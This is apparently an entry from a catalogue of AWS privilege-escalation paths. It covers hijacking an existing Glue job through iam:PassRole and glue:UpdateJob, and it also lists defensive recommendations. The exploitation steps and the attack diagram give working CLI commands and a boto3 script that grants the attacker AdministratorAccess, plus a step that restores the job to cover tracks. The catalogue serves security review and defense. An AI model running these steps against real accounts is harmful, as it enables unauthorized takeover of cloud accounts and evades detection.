id: "glue-005"
name: "iam:PassRole + glue:UpdateJob + glue:StartJobRun"
category: "service-passrole"
services:
  - iam
  - glue

permissions:
  required:
    - permission: "iam:PassRole"
      resourceConstraints: "Must be able to pass a role to glue.amazonaws.com"
    - permission: "glue:UpdateJob"
      resourceConstraints: "Must be able to update existing Glue job configurations"
    - permission: "glue:StartJobRun"
      resourceConstraints: "Must be able to start Glue job runs"
  additional:
    - permission: "glue:GetJob"
      resourceConstraints: "Helpful for retrieving current job configuration before modification"
    - permission: "glue:ListJobs"
      resourceConstraints: "Useful for discovering existing Glue jobs that can be modified"
    - permission: "glue:GetJobRun"
      resourceConstraints: "Helpful for monitoring job execution details"
    - permission: "glue:GetJobRuns"
      resourceConstraints: "Useful for listing job runs to track execution history"
    - permission: "iam:ListRoles"
      resourceConstraints: "Helpful for discovering available privileged roles to pass"
    - permission: "iam:GetRole"
      resourceConstraints: "Useful for viewing role trust policies and attached permissions"

description: A principal with `iam:PassRole`, `glue:UpdateJob`, and `glue:StartJobRun` can modify an existing AWS Glue ETL job to execute with an administrative role and malicious Python code that grants the starting principal administrative access. Unlike the `glue:CreateJob` privilege escalation technique where an attacker creates a new Glue job, this scenario exploits the ability to update an existing job that already exists in the environment. This approach can be stealthier because existing Glue jobs are common in production environments running legitimate ETL workloads, updating a job generates different CloudTrail events than creating new resources, security monitoring may focus more on resource creation than modification, and the attack can blend in with normal job maintenance activities. When updating a Glue job, an attacker can change both the IAM role the job uses (via `iam:PassRole`) and the script location. By pointing the job to a malicious Python script and passing an administrative role, they can execute arbitrary code with elevated privileges when the job runs. The attacker modifies an existing job's configuration to use a privileged role and malicious script location, manually starts the job execution, and the job executes Python code that modifies IAM permissions to grant the starting principal administrative access.

prerequisites:
  admin:
    - "An existing Glue job must be present in the environment that can be modified"
    - "A role must exist that trusts glue.amazonaws.com to assume it"
    - "The role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)"
  lateral:
    - "An existing Glue job must be present in the environment that can be modified"
    - "A role must exist that trusts glue.amazonaws.com to assume it"
    - "The role's permissions determine the level of access gained"

limitations: |
  This path requires a pre-existing Glue job to modify, unlike glue:CreateJob which can be executed in any environment. The path provides administrative access only if the passed role has administrative permissions (e.g., AdministratorAccess policy). If only limited roles are available in the environment, you gain access limited to those role's permissions. However, even limited access may enable multi-hop attacks or access to sensitive data. The level of access depends entirely on the permissions of the role that can be passed to the Glue service. This technique is harder to detect than CreateJob because job updates are routine operational activities.

exploitationSteps:
  awscli:
    - step: 1
      command: |
        # List existing Glue jobs to find one to modify
        aws glue list-jobs --region us-east-1
      description: "Discover existing Glue jobs in the environment. Choose a job that you have permission to update. Jobs that run infrequently or are not actively monitored are ideal targets."

    - step: 2
      command: |
        # View current job configuration
        aws glue get-job \
          --region us-east-1 \
          --job-name existing-job-name \
          --query 'Job.{Role: Role, Script: Command.ScriptLocation}'
      description: "Retrieve the current job configuration to see its existing role and script location. Document these values if you need to restore the job after the attack."

    - step: 3
      command: |
        # Create Python script that attaches admin policy (upload to S3)
        # Example script content:
        import boto3
        iam = boto3.client('iam')
        iam.attach_user_policy(
            UserName='target-username',
            PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
        )
      description: "Prepare a Python script that will attach AdministratorAccess policy to your starting principal. Upload this script to an S3 bucket that the Glue job can access."

    - step: 4
      command: |
        aws glue update-job \
          --region us-east-1 \
          --job-name existing-job-name \
          --job-update "Role=arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE,Command={Name=pythonshell,ScriptLocation=s3://bucket/escalation_script.py,PythonVersion=3.9}"
      description: "Update the existing Glue job to use the privileged role and point to your malicious script. The Role parameter uses iam:PassRole to assign the administrative role. The ScriptLocation is changed to your escalation script."

    - step: 5
      command: |
        aws glue start-job-run \
          --region us-east-1 \
          --job-name existing-job-name
      description: "Start the updated Glue job. This executes your malicious Python script with the privileges of the administrative role you passed to the job."

    - step: 6
      command: |
        # Wait 1-2 minutes for job completion
        aws glue get-job-run \
          --region us-east-1 \
          --job-name existing-job-name \
          --run-id JOB_RUN_ID \
          --query 'JobRun.JobRunState'
      description: "Monitor the job execution status. Wait for the JobRunState to show SUCCEEDED, which indicates your script has completed execution."

    - step: 7
      command: |
        # Wait 15 seconds for IAM policy propagation
        sleep 15
        # Verify admin access
        aws iam list-users
      description: "After the job completes and IAM changes propagate, verify that you now have administrative permissions by executing a privileged operation."

    - step: 8
      command: |
        # Optional: Restore original job configuration to cover tracks
        aws glue update-job \
          --region us-east-1 \
          --job-name existing-job-name \
          --job-update "Role=arn:aws:iam::ACCOUNT_ID:role/ORIGINAL_ROLE,Command={Name=pythonshell,ScriptLocation=s3://original-bucket/original_script.py,PythonVersion=3.9}"
      description: "Optionally restore the job to its original configuration to reduce the likelihood of detection. Use the values you documented in step 2."

recommendation: |
  **Restrict PassRole permissions:** Never grant `iam:PassRole` with wildcards. Use resource-based conditions to limit which roles can be passed and to which services:

  ```json
  {
    "Effect": "Allow",
    "Action": "iam:PassRole",
    "Resource": "arn:aws:iam::*:role/approved-glue-roles-*",
    "Condition": {
      "StringEquals": {
        "iam:PassedToService": "glue.amazonaws.com"
      }
    }
  }
  ```

  **Implement SCPs to prevent privilege escalation:** Use Service Control Policies to deny PassRole on administrative roles to Glue services:

  ```json
  {
    "Effect": "Deny",
    "Action": "iam:PassRole",
    "Resource": [
      "arn:aws:iam::*:role/*admin*",
      "arn:aws:iam::*:role/*Admin*"
    ],
    "Condition": {
      "StringEquals": {
        "iam:PassedToService": "glue.amazonaws.com"
      }
    }
  }
  ```

  **Separate CreateJob and UpdateJob permissions:** Grant `glue:CreateJob` and `glue:UpdateJob` to different personas. Data engineers who create new ETL jobs shouldn't necessarily have permission to modify all existing jobs.

  **Monitor CloudTrail for Glue job updates:** Alert on `UpdateJob` API calls, especially when:
  - The `Role` parameter changes to a more privileged role
  - The `ScriptLocation` parameter changes to a different S3 bucket
  - UpdateJob is followed quickly by StartJobRun (< 5 minutes)
  - Updates are performed by users who don't typically manage Glue resources
  - Changes occur outside of approved change windows

  **Implement configuration baselines:** Use AWS Config rules to track approved configurations for each Glue job:
  - Monitor for role ARN changes
  - Alert on script location changes from trusted S3 buckets
  - Detect jobs running with administrative policies
  - Enforce tagging requirements for all jobs

  **Restrict glue:UpdateJob permissions:** Only grant these permissions to users who legitimately need to modify Glue jobs. Consider requiring approval workflows for job configuration changes.

  **Restrict script locations:** Use SCPs or IAM conditions to require all Glue job scripts to be stored in approved, audited S3 buckets. Monitor S3 buckets containing Glue scripts for unauthorized modifications.

  **Monitor IAM policy changes from Glue service principal:** Set up CloudWatch alarms for IAM policy modifications (`AttachUserPolicy`, `AttachRolePolicy`) where the source is the Glue service principal.

  **Use IAM Access Analyzer:** Enable IAM Access Analyzer to automatically detect privilege escalation paths involving PassRole and Glue services. Review findings regularly and remediate identified risks.

  **Implement least privilege for Glue roles:** When creating IAM roles for Glue services, grant only the minimum permissions required for the specific ETL tasks. Avoid using administrative policies like `AdministratorAccess`. Typical Glue jobs need S3, Glue Data Catalog, and CloudWatch Logs accessâ€”not IAM permissions.

discoveredBy:
  name: "Carlos Polop"
  organization: "HackTricks"
  date: "Unknown"

references:
  - title: "HackTricks - AWS Glue Privilege Escalation"
    url: "https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-privilege-escalation/aws-glue-privesc/index.html"
  - title: "Rhino Security Labs - CloudGoat Glue_privesc Walkthrough"
    url: "https://rhinosecuritylabs.com/cloud-security/cloudgoat-walkthrough-glue_privesc/"
  - title: "CloudGoat - glue_privesc Scenario"
    url: "https://github.com/RhinoSecurityLabs/cloudgoat/tree/master/cloudgoat/scenarios/aws/glue_privesc"
  - title: "AWS Glue UpdateJob API Documentation"
    url: "https://docs.aws.amazon.com/glue/latest/webapi/API_UpdateJob.html"
  - title: "AWS Glue Jobs Documentation"
    url: "https://docs.aws.amazon.com/glue/latest/dg/author-job.html"
  - title: "AWS IAM PassRole Documentation"
    url: "https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_use_passrole.html"

relatedPaths:
  - "glue-001"
  - "glue-002"
  - "glue-003"
  - "glue-004"
  - "glue-006"
  - "lambda-001"
  - "ec2-001"

attackVisualization:
  nodes:
    - id: start
      label: Starting Principal
      type: principal
      description: |
        The principal with `iam:PassRole`, `glue:UpdateJob`, and `glue:StartJobRun` permissions. Can be an IAM user or role.

        This principal can modify existing Glue jobs, pass IAM roles to them, and manually trigger their execution. The ability to update existing jobs makes this attack stealthier than creating new resources.

    - id: existing_job
      label: Existing Glue Job
      type: resource
      description: |
        A pre-existing AWS Glue job already deployed in the environment. This job is part of normal production infrastructure running legitimate ETL workloads.

        **Stealth Factor**: The attacker modifies this existing job rather than creating a new suspicious resource. The update changes:
        - **Role**: From non-privileged service role to privileged target role (via iam:PassRole)
        - **Script**: From benign production script to malicious escalation script

        ```bash
        aws glue update-job \
          --job-name existing-job-name \
          --job-update "Role=arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE,Command={Name=pythonshell,ScriptLocation=s3://bucket/escalation_script.py,PythonVersion=3.9}"
        ```

        UpdateJob events are common in production and blend in with normal maintenance activities.

    - id: target_role
      label: Existing Role That Trusts the glue Service
      type: resource
      description: |
        The privileged IAM role that is passed to the Glue job during the update. This role must have a trust policy allowing glue.amazonaws.com to assume it.

        When the updated job runs, it assumes this role and receives temporary credentials. The permissions of this role determine what the malicious script can accomplish.

    - id: execute_code
      label: Execute Code with Target Role Permissions
      type: action
      description: |
        The starting principal manually triggers execution of the modified job:

        ```bash
        aws glue start-job-run --job-name existing-job-name
        ```

        The job executes in the AWS Glue managed environment with the target role's credentials. The malicious Python script runs and attempts to modify IAM permissions:

        ```python
        import boto3
        iam = boto3.client('iam')
        iam.attach_user_policy(
            UserName='starting-principal',
            PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
        )
        ```

        **Stealth**: From CloudTrail logs, this looks like a normal execution of an existing production job.

    - id: admin
      label: Effective Administrator
      type: outcome
      description: |
        The target role has administrative permissions (e.g., AdministratorAccess or iam:* permissions). The Python script successfully uses these permissions to attach the AdministratorAccess policy to the starting principal.

        The starting principal now has full administrative access to the AWS account. The attacker can optionally restore the job to its original configuration to cover their tracks.

    - id: some_perms
      label: Some Additional Access
      type: outcome
      color: '#ffeb99'
      description: |
        The target role has some elevated permissions but not full IAM write access. The script may gain access to:
        - Sensitive data in S3, databases, or other AWS services
        - Secrets in AWS Secrets Manager or Parameter Store
        - Multi-hop privilege escalation opportunities

    - id: no_perms
      label: No Additional Access
      type: outcome
      color: '#cccccc'
      description: |
        The target role has only minimal permissions (e.g., basic Glue service permissions). The script cannot perform meaningful privilege escalation, though it demonstrates a security gap in job update permissions.

  edges:
    - from: start
      to: existing_job
      label: glue:UpdateJob + glue:StartJobRun
      description: |
        The starting principal uses `glue:UpdateJob` to modify an existing Glue job, changing its execution role (via `iam:PassRole`) and script location to point to a malicious Python script. Then uses `glue:StartJobRun` to execute the modified job.

        This is a **stealth technique** because:
        - Modifies existing infrastructure rather than creating new resources
        - UpdateJob events are routine in production environments
        - Job executions look like normal operational activity

    - from: existing_job
      to: target_role
      label: Job assumes passed role
      description: |
        When the job starts executing, it automatically assumes the target role that was passed during the update. The Glue service requests temporary credentials from AWS STS for this role.

        The job now has all the permissions granted to the target role.

    - from: target_role
      to: execute_code
      label: Script executes with role permissions
      description: |
        The malicious Python script executes in the Glue job environment with the temporary credentials from the target role. The script uses boto3 to interact with AWS APIs and attempt privilege escalation.

        The script's success depends entirely on what permissions the target role has.

    - from: execute_code
      to: admin
      label: If role has IAM write permissions
      branch: A
      condition: admin
      description: |
        If the target role has AdministratorAccess or `iam:AttachUserPolicy` permission, the script successfully attaches the AdministratorAccess policy to the starting principal.

        The starting principal now has full administrative access.

    - from: execute_code
      to: some_perms
      label: If role has some elevated permissions
      branch: B
      condition: some_permissions
      description: |
        If the target role has elevated permissions but not IAM write access, the attacker gains partial access such as reading sensitive data or accessing other AWS services.

    - from: execute_code
      to: no_perms
      label: If role has minimal permissions
      branch: C
      condition: no_permissions
      description: |
        If the target role only has basic Glue service permissions, the script cannot perform meaningful privilege escalation.
